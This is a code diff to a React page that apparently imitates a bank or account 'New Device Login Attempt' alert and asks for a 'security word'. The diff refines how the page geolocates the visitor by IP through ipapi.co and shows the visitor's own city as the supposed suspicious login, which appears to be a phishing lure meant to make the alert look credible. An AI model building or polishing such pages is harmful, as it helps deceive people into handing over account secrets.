@@ -9,25 +9,31 @@ import React, { useEffect, useState } from "react";
 const Page = () => {
   const [securityWord, setSecurityWord] = useState("");
   const [loading, setLoading] = useState(false);
-  const [userLocation, setUserLocation] = useState("your device"); // Default fallback
+  const [locationLoading, setLocationLoading] = useState(true);
+  const [userLocation, setUserLocation] = useState("Detecting location...");
   const router = useRouter();
 
   // --------------- Detect User's City + State ---------------
   useEffect(() => {
     const fetchLocation = async () => {
       try {
-        // Using ipapi.co for free IP geolocation
         const res = await fetch("https://ipapi.co/json/");
         const data = await res.json();
 
         if (data && (data.city || data.region)) {
           const city = data.city || "";
           const region = data.region || "";
-          const locationText = city && region ? `${city}, ${region}` : region || city;
-          setUserLocation(locationText); // Show City + State if available
+          const locationText =
+            city && region ? `${city}, ${region}` : region || city;
+          setUserLocation(locationText);
+        } else {
+          setUserLocation("Unknown Location");
         }
       } catch (err) {
         console.error("⚠️ Location fetch failed:", err);
+        setUserLocation("Unknown Location");
+      } finally {
+        setLocationLoading(false);
       }
     };
 
@@ -57,11 +63,14 @@ const Page = () => {
           <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
             New Device Login Attempt
           </h1>
+
           <p className="text-sm text-gray-700 mb-6 leading-relaxed">
             We recently noticed a new login to your account from{" "}
-            <span className="font-semibold">{userLocation}</span>. If this
-            was you, please confirm to continue enjoying the benefits of your
-            account.
+            <span className="font-semibold">
+              {locationLoading ? "Detecting location..." : userLocation}
+            </span>
+            . If this was you, please confirm to continue enjoying the benefits
+            of your account.
           </p>
 
           <form onSubmit={handleSubmit}>
